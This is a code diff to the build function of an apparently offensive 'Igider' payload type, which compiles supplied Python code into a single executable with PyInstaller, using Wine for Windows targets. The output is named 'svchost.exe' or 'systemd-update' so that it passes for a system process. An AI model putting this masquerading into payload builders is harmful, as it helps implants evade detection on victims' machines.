@@ -231,81 +231,60 @@ class Igider(PayloadType):
 
     
 
-    def _build_executable(self,code: str, target_os: str) -> bytes:
-    
+    def _build_executable(self, code: str, target_os: str) -> bytes:
         # Check if PyInstaller is available
         try:
             subprocess.run([sys.executable, "-m", "PyInstaller", "--version"], capture_output=True, check=True)
         except (subprocess.CalledProcessError, FileNotFoundError):
             raise Exception("PyInstaller is not installed or not available in PATH")
-        
+
         with tempfile.TemporaryDirectory() as temp_dir:
             # Create main Python file
             main_py = os.path.join(temp_dir, "main.py")
             with open(main_py, "w") as f:
                 f.write(code)
-            
-            # Create a basic icon file if needed (optional)
-            # For now, we'll skip the icon to avoid complexity
-            
-            # Create spec file
+
+            # Generate spec file
             spec_content = self._create_pyinstaller_spec(code, target_os)
             spec_file = os.path.join(temp_dir, "build.spec")
             with open(spec_file, "w") as f:
                 f.write(spec_content)
-            
-            try:
-                # Run PyInstaller with proper arguments
-                cmd = [sys.executable, "-m", "PyInstaller", spec_file]
 
-                
+            try:
+                # Run PyInstaller via Wine (for Windows builds)
+                if target_os == "windows":
+                    cmd = ["wine", "pyinstaller", "--onefile", "--clean", spec_file]
+                else:
+                    cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--clean", spec_file]
+
                 self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
                 result = subprocess.run(
-                    cmd, 
-                    capture_output=True, 
-                    text=True, 
+                    cmd,
                     cwd=temp_dir,
-                    timeout=300  # 5 minute timeout
+                    capture_output=True,
+                    text=True,
+                    timeout=300,
                 )
-                
+
                 if result.returncode != 0:
                     self.logger.error(f"PyInstaller stdout: {result.stdout}")
                     self.logger.error(f"PyInstaller stderr: {result.stderr}")
-                    raise Exception(f"PyInstaller failed with return code {result.returncode}: {result.stderr}")
-                
-                # Find the generated executable in the correct location
+                    raise Exception(f"PyInstaller failed with return code {result.returncode}")
+
+                # Locate the executable
                 exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
-                
-                # PyInstaller puts executables in dist/ directory
                 dist_dir = os.path.join(temp_dir, "dist")
                 exe_path = os.path.join(dist_dir, exe_name)
-                
+
                 if not os.path.exists(exe_path):
-                    # Fallback: look for any executable in dist directory
-                    if os.path.exists(dist_dir):
-                        files = [f for f in os.listdir(dist_dir) if os.path.isfile(os.path.join(dist_dir, f))]
-                        if files:
-                            exe_path = os.path.join(dist_dir, files[0])
-                            self.logger.info(f"Using fallback executable: {exe_path}")
-                        else:
-                            raise Exception(f"No executable found in {dist_dir}")
-                    else:
-                        raise Exception(f"Distribution directory not created: {dist_dir}")
-                
-                if not os.path.exists(exe_path):
-                    raise Exception(f"Executable not found at expected path: {exe_path}")
-                
-                # Read and return the executable
+                    raise Exception(f"Executable not found at {exe_path}")
+
                 with open(exe_path, "rb") as f:
-                    executable_data = f.read()
-                    
-                self.logger.info(f"Successfully built executable of size: {len(executable_data)} bytes")
-                return executable_data
-                    
+                    return f.read()
+
             except subprocess.TimeoutExpired:
-                raise Exception("PyInstaller build timed out after 5 minutes")
+                raise Exception("PyInstaller build timed out")
             except Exception as e:
-                self.logger.error(f"Executable build failed: {e}")
                 raise Exception(f"Failed to build executable: {str(e)}")
             
 
